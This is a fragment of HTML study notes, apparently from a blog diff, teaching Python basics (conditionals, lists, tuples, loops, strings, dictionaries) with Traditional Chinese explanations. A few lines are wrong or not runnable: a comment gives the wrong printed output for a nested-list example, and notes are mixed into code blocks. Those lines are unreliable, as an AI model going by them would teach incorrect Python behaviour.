+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    <span class="comment"># code to be executed if the condition is true</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># code to be executed if the condition is false</span></span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is positive&quot;</span>)<span class="comment">#如果 x 大於 0，則會執行第一個區塊 (print(&quot;x is Positive&quot;))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is not positive&quot;</span>)<span class="comment">#否則，將執行第二個區塊（print（“x is not positive”)）</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>if-elif-else Statement:</p>
+<ul>
+<li>if-elif-else 語句可讓您<strong>檢查多個條件</strong>並根據這些條件執行不同的程式碼區塊</li>
+<li>提供了兩個以上的分支選項</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1:</span><br><span class="line">    <span class="comment"># code to be executed if condition1 is true</span></span><br><span class="line"><span class="keyword">elif</span> condition2:</span><br><span class="line">    <span class="comment"># code to be executed if condition1 is false and condition2 is true</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># code to be executed if all conditions are false</span></span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is positive&quot;</span>)<span class="comment">#如果 x 大於 0，則將執行第一個區塊</span></span><br><span class="line"><span class="keyword">elif</span> x &lt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is negative&quot;</span>)<span class="comment">#如果小於0，則執行第二個區塊</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is zero&quot;</span>)<span class="comment">#否則，如果沒有一個條件為真，則會執行第三個區塊。</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Conditional Statements</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">money</span>):</span><br><span class="line">	<span class="keyword">if</span> money &gt;= <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;You&#x27;ve got yourself a drink!&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;No drink for you!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(drink(<span class="number">3</span>))<span class="comment">#You&#x27;ve got yourself a drink!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(drink(<span class="number">1</span>))<span class="comment">#No drink for you!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alcohol</span>(<span class="params">age,money</span>):</span><br><span class="line">	<span class="keyword">if</span>(age &gt;= <span class="number">21</span>) <span class="keyword">and</span> (money &gt;= <span class="number">5</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;We&#x27;re getting a drink!&quot;</span></span><br><span class="line">	<span class="keyword">elif</span> (age &gt;= <span class="number">21</span>) <span class="keyword">and</span> (money &lt; <span class="number">5</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Come back with more money.&quot;</span></span><br><span class="line">	<span class="keyword">elif</span> (age &lt; <span class="number">21</span>) <span class="keyword">and</span> (money &gt;= <span class="number">5</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Nice try, kid!&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;You&#x27;re too poor and too young!&quot;</span></span><br><span class="line">		</span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">21</span>,<span class="number">5</span>))<span class="comment">#We&#x27;re getting a drink!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">21</span>,<span class="number">4</span>))<span class="comment">#Come back with more money.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">20</span>,<span class="number">5</span>))<span class="comment">#Nice try, kid!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">20</span>,<span class="number">4</span>))<span class="comment">#You&#x27;re too poor and too young!</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><ul>
+<li><p>通用且可變的資料結構</p>
+</li>
+<li><p>可以保存項目的集合</p>
+</li>
+<li><p>允許您在單一變數中儲存不同資料類型的多個值</p>
+</li>
+<li><p>儲存和操作項目集合</p>
+</li>
+<li><p>List Creation</p>
+<ul>
+<li>將逗號分隔的值括在方括號內</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>List Access</p>
+<ul>
+<li>可以使用索引存取清單中的各個元素</li>
+<li>第一個元素的索引從 0 開始，一直到列表長度減一</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(fruits[<span class="number">0</span>])    <span class="comment"># Output: &quot;apple&quot;</span></span><br><span class="line"><span class="built_in">print</span>(fruits[<span class="number">2</span>])    <span class="comment"># Output: &quot;orange&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>List Modification</p>
+<ul>
+<li>清單是可變的，這意味著您可以修改它們的元素</li>
+<li>新值指派給清單中的特定位置或使用方法來修改清單本身</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;grape&quot;</span>     <span class="comment"># Modifying an element</span></span><br><span class="line">fruits.append(<span class="string">&quot;kiwi&quot;</span>)   <span class="comment"># Adding an element to the end</span></span><br><span class="line">fruits.remove(<span class="string">&quot;apple&quot;</span>)  <span class="comment"># Removing an element</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>List Operations</p>
+<ul>
+<li>對清單執行的各種操作</li>
+<li>Concatenation<ul>
+<li>使用 + 運算子連接兩個或多個清單</li>
+</ul>
+</li>
+<li>Length<ul>
+<li>len() 函數傳回列表中元素的數量</li>
+</ul>
+</li>
+<li>Slicing<ul>
+<li>使用切片從清單中提取子清單</li>
+</ul>
+</li>
+<li>Iteration<ul>
+<li>使用循環來迭代列表的元素</li>
+</ul>
+</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>]</span><br><span class="line">fruits2 = [<span class="string">&quot;grape&quot;</span>, <span class="string">&quot;kiwi&quot;</span>]</span><br><span class="line"></span><br><span class="line">combined = fruits + fruits2</span><br><span class="line"><span class="built_in">print</span>(combined)         <span class="comment"># Output: [&quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;, &quot;grape&quot;, &quot;kiwi&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fruits))      <span class="comment"># Output: 3</span></span><br><span class="line"></span><br><span class="line">sublist = fruits[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(sublist)          <span class="comment"># Output: [&quot;banana&quot;, &quot;orange&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> fruits:</span><br><span class="line">    <span class="built_in">print</span>(fruit)        <span class="comment"># Output: &quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Lists - Have brackets []</span></span><br><span class="line">movies = [<span class="string">&quot;When Harry Met Sally&quot;</span>, <span class="string">&quot;The Hangover&quot;</span>, <span class="string">&quot;The Perks of Being a Wallflower&quot;</span>, <span class="string">&quot;The Exorcist&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#returns the second item in the list - index / indices</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>]) <span class="comment">#The Hangover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns the first item in the list</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">0</span>]) <span class="comment">#When Harry Met Sally</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns the first number given until right before last number given</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>:<span class="number">3</span>]) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns all </span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>:<span class="number">4</span>]) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns everything from number to end of list</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>:]) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#everything before 1</span></span><br><span class="line"><span class="built_in">print</span>(movies[:<span class="number">1</span>]) <span class="comment">#[&#x27;When Harry Met Sally&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(movies[:<span class="number">2</span>]) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#grabs last item</span></span><br><span class="line"><span class="built_in">print</span>(movies[-<span class="number">1</span>]) <span class="comment">#The Exorcist</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#counts items in list</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(movies)) <span class="comment">#4</span></span><br><span class="line">movies.append(<span class="string">&quot;JAWS&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#appends to end of list</span></span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;, &#x27;JAWS&#x27;]</span></span><br><span class="line"></span><br><span class="line">movies.insert(<span class="number">2</span>, <span class="string">&quot;Hustle&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;, &#x27;JAWS&#x27;]</span></span><br><span class="line"></span><br><span class="line">movies.pop() <span class="comment">#removes last item</span></span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line">movies.pop(<span class="number">0</span>) <span class="comment">#removes first item </span></span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line">amber_movies = [<span class="string">&#x27;Just Go With It&#x27;</span>, <span class="string">&#x27;50 First Dates&#x27;</span>]</span><br><span class="line">our_favorite_movies = movies + amber_movies</span><br><span class="line"><span class="built_in">print</span>(our_favorite_movies)<span class="comment">#[&#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;, &#x27;Just Go With It&#x27;, &#x27;50 First Dates&#x27;]</span></span><br><span class="line"></span><br><span class="line">grades = [[<span class="string">&quot;Bob&quot;</span>, <span class="number">82</span>], [<span class="string">&quot;Alice&quot;</span>, <span class="number">90</span>], [<span class="string">&quot;Jeff&quot;</span>, <span class="number">73</span>]]</span><br><span class="line">bobs_grade = grades[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(bobs_grade)<span class="comment">#82</span></span><br><span class="line">grades[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">83</span></span><br><span class="line"><span class="built_in">print</span>(bobs_grade)<span class="comment">#[[&#x27;Bob&#x27;, 83], [&#x27;Alice&#x27;, 90], [&#x27;Jeff&#x27;, 73]]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Tuples"><a href="#Tuples" class="headerlink" title="Tuples"></a>Tuples</h3><ul>
+<li>元組是元素的有序集合，類似於列表</li>
+<li>元組是不可變的，元素一旦創建就無法修改</li>
+<li>建立元組，請將逗號分隔的值括在括號 ( ) 內</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = (<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Tuple Access</p>
+<ul>
+<li>使用索引存取元組中的各個元素，類似於清單</li>
+<li>第一個元素的索引從 0 開始</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(fruits[<span class="number">0</span>])    <span class="comment"># Output: &quot;apple&quot;</span></span><br><span class="line"><span class="built_in">print</span>(fruits[<span class="number">2</span>])    <span class="comment"># Output: &quot;orange&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Tuple Immutability</p>
+<ul>
+<li>元組是不可變的，無法修改它們的元素</li>
+<li>一旦創建，其值就無法變更</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;grape&quot;</span>    <span class="comment"># This will raise an error</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Tuple Operations</p>
+<ul>
+<li>Concatenation<ul>
+<li>使用 + 運算子連接兩個或多個元組</li>
+</ul>
+</li>
+<li>Length<ul>
+<li>len() 函數傳回元組中元素的數量</li>
+</ul>
+</li>
+<li>Slicing<ul>
+<li>使用切片從元組中提取子元組</li>
+</ul>
+</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = (<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>)</span><br><span class="line">fruits2 = (<span class="string">&quot;grape&quot;</span>, <span class="string">&quot;kiwi&quot;</span>)</span><br><span class="line"></span><br><span class="line">combined = fruits + fruits2</span><br><span class="line"><span class="built_in">print</span>(combined)         <span class="comment"># Output: (&quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;, &quot;grape&quot;, &quot;kiwi&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fruits))      <span class="comment"># Output: 3</span></span><br><span class="line"></span><br><span class="line">subtuple = fruits[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(subtuple)         <span class="comment"># Output: (&quot;banana&quot;, &quot;orange&quot;)</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>想要儲存不應變更的值集合的情況下，元組非常有用</p>
+</li>
+<li><p>可用於對相關資料元素進行分組，也可用作字典中的鍵</p>
+</li>
+<li><p>更快的效能和防止意外修改</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Tuples - Do not change, ()</span></span><br><span class="line">grades = (<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;f&quot;</span>)</span><br><span class="line"></span><br><span class="line">grades.pop, grades.append won<span class="string">&#x27;t work - not mutable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(grades[1])#b</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="looping"><a href="#looping" class="headerlink" title="looping"></a>looping</h3><ul>
+<li><p>循環允許您多次重複一段程式碼</p>
+</li>
+<li><p>用於迭代資料結構、執行重複任務和控製程式流程</p>
+</li>
+<li><p><code>for</code> loops and <code>while</code> loops</p>
+</li>
+<li><p>for Loop</p>
+<ul>
+<li>用於迭代序列（例如列表、元組、字串或範圍）或任何可迭代物件</li>
+<li>根據序列中的元素或項目執行固定次數的程式碼區塊</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sequence:</span><br><span class="line">    <span class="comment"># code to be executed for each item in the sequence</span></span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> fruits:</span><br><span class="line">    <span class="built_in">print</span>(fruit)</span><br><span class="line"><span class="comment">#for 迴圈迭代水果清單中的每個項目，並為每個項目執行循環內的程式碼區塊 (print(fruit))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">apple</span></span><br><span class="line"><span class="string">banana</span></span><br><span class="line"><span class="string">orange</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>while Loop</p>
+<ul>
+<li>在給定條件為true時重複執行程式碼區塊</li>
+<li>它繼續循環，直到條件變成false</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition:</span><br><span class="line">    <span class="comment"># code to be executed while the condition is true</span></span><br><span class="line"></span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:<span class="comment">#條件 count &lt; 5 為true</span></span><br><span class="line">    <span class="built_in">print</span>(count)<span class="comment">#while 迴圈就會繼續執行迴圈內的程式碼 (print(count))</span></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>The break and continue Statements</p>
+<ul>
+<li>在 loops 內，您可以使用 break 語句提前退出循環</li>
+<li>並使用Continue語句跳過目前迭代並移至下一個迭代</li>
+<li>提供了一種強大的機制，用於迭代資料、執行計算和控製程式流程</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#For loops - start to finish of an iterate</span></span><br><span class="line">vegetables = [<span class="string">&quot;cucumber&quot;</span>, <span class="string">&quot;spinach&quot;</span>, <span class="string">&quot;cabbage&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> vegetables:</span><br><span class="line">	<span class="built_in">print</span>(x)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#While loops - execute as long as true</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">10</span>:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 break 退出循環</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;使用 break 退出循環:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 當 i 等於 5 ，退出循環</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;循環结束\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;使用 continue跳過當前迭代:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 當i是偶數，跳過該迭代</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;循环结束&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Advanced-Strings"><a href="#Advanced-Strings" class="headerlink" title="Advanced Strings"></a><strong>Advanced Strings</strong></h3><ul>
+<li><p><code>str</code> (string) 表示用單引號 (‘ ‘) 或雙引號 (“ “) 括起來的字元序列</p>
+</li>
+<li><p>Python 中的字串是不可變的，這意味著它們在創建後就無法更改</p>
+</li>
+<li><p>Creation</p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&#x27;Hello, World!&#x27;</span> <span class="keyword">or</span> my_string = <span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Accessing Characters</p>
+<ul>
+<li>使用從 0 開始的索引來存取字串中的各個字元</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string[<span class="number">0</span>])<span class="comment">#H</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Concatenation</p>
+<ul>
+<li>使用 + 運算子連接（連接）兩個或多個字串</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greeting = <span class="string">&#x27;Hello&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;World!&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Length</p>
+<ul>
+<li>len() 函數可用於確定字串的長度（字元數）</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_string))<span class="comment">#output the length of the string</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Slicing</p>
+<ul>
+<li>使用切片從字串中提取子字串，並指定開始和結束索引</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">substring = my_string[<span class="number">7</span>:<span class="number">12</span>]<span class="comment">#extract the substring &#x27;World&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Methods</p>
+<ul>
+<li>提供了各種內建方法來操作和轉換字串</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string.upper())<span class="comment">#output &#x27;HELLO, WORLD!&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Formatting</p>
+<ul>
+<li>字串格式允許您在字串中嵌入值</li>
+<li>使用 % 運算子或 format() 方法來完成</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;Alice&#x27;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My name is %s and I&#x27;m %d years old.&quot;</span> % (name, age))</span><br><span class="line"><span class="comment"># Output: My name is Alice and I&#x27;m 30 years old.</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ADVANCED STRINGS</span></span><br><span class="line"></span><br><span class="line">my_name = <span class="string">&quot;Heath&quot;</span></span><br><span class="line"><span class="comment">#first letter</span></span><br><span class="line"><span class="built_in">print</span>(my_name[<span class="number">0</span>]) <span class="comment">#H</span></span><br><span class="line"><span class="comment">#last letter</span></span><br><span class="line"><span class="built_in">print</span>(my_name[-<span class="number">1</span>]) <span class="comment">#h</span></span><br><span class="line"></span><br><span class="line">sentence = <span class="string">&quot;This is a sentence.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(sentence[:<span class="number">4</span>])<span class="comment">#This</span></span><br><span class="line"><span class="comment">#delimeter - default is a space </span></span><br><span class="line"><span class="built_in">print</span>(sentence.split()) <span class="comment">#[&#x27;This&#x27;, &#x27;is&#x27;, &#x27;a&#x27;, &#x27;sentence.&#x27;]</span></span><br><span class="line"></span><br><span class="line">sentence_split = sentence.split()</span><br><span class="line">sentence_join = <span class="string">&#x27; &#x27;</span>.join(sentence_split)</span><br><span class="line"><span class="built_in">print</span>(sentence_join)<span class="comment">#This is a sentence.</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;apple,banana,orange&quot;</span></span><br><span class="line">parts = s.split(<span class="string">&quot;,&quot;</span>)  <span class="comment"># 使用逗號分隔</span></span><br><span class="line"><span class="built_in">print</span>(parts)  <span class="comment"># 輸出: [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;]</span></span><br><span class="line"></span><br><span class="line">parts = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">s = <span class="string">&quot;,&quot;</span>.join(parts)  <span class="comment"># 使用逗号連接</span></span><br><span class="line"><span class="built_in">print</span>(s)  <span class="comment"># 輸出: &quot;apple,banana,orange&quot;</span></span><br><span class="line"></span><br><span class="line">quote = <span class="string">&quot;He said, &#x27;give me all your money&#x27;&quot;</span> - show example</span><br><span class="line">quote = <span class="string">&quot;He said, \&quot;give me all your money\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(quote)<span class="comment">#He said, &quot;give me all your money&quot;</span></span><br><span class="line"></span><br><span class="line">too_much_space = <span class="string">&quot;                       hello          &quot;</span></span><br><span class="line"><span class="built_in">print</span>(too_much_space.strip())<span class="comment">#hello</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Apple&quot;</span>) <span class="comment">#returns true</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Apple&quot;</span>) <span class="comment">#returns false - case sensitive</span></span><br><span class="line"></span><br><span class="line">letter = <span class="string">&quot;A&quot;</span></span><br><span class="line">word = <span class="string">&quot;Apple&quot;</span></span><br><span class="line"><span class="built_in">print</span>(letter.lower() <span class="keyword">in</span> word.lower()) <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line">movie = <span class="string">&quot;The Hangover&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My favorite movie is &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(movie))<span class="comment">#My favorite movie is The Hangover.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My favorite movie is %s&quot;</span> % movie)<span class="comment">#My favorite movie is The Hangover</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My favorite movie is <span class="subst">&#123;movie&#125;</span>&quot;</span>)<span class="comment">#My favorite movie is The Hangover</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Dictionaries"><a href="#Dictionaries" class="headerlink" title="Dictionaries"></a><strong>Dictionaries</strong></h3><ul>
+<li><p>字典是鍵值對的無序集合</p>
+</li>
+<li><p>多功能且功能強大的資料結構</p>
+</li>
+<li><p>基於唯一鍵儲存、檢索和操作資料</p>
+</li>
+<li><p>Dictionary Creation</p>
+<ul>
+<li>將鍵值對括在大括號 { } 內，並用冒號 : 分隔每對</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">student = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">&quot;major&quot;</span>: <span class="string">&quot;Computer Science&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Dictionary Access:</p>
+<ul>
+<li>引用對應的鍵來存取字典中的值</li>
+<li>鍵提供了一種唯一標識和檢索值的方法</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(student[<span class="string">&quot;name&quot;</span>])   <span class="comment"># Output: &quot;Alice&quot;</span></span><br><span class="line"><span class="built_in">print</span>(student[<span class="string">&quot;age&quot;</span>])    <span class="comment"># Output: 20</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Dictionary Modification</p>
+<ul>
+<li>字典是可變的</li>
+<li>透過將新值指派給特定鍵來修改它們的值</li>
+</ul>
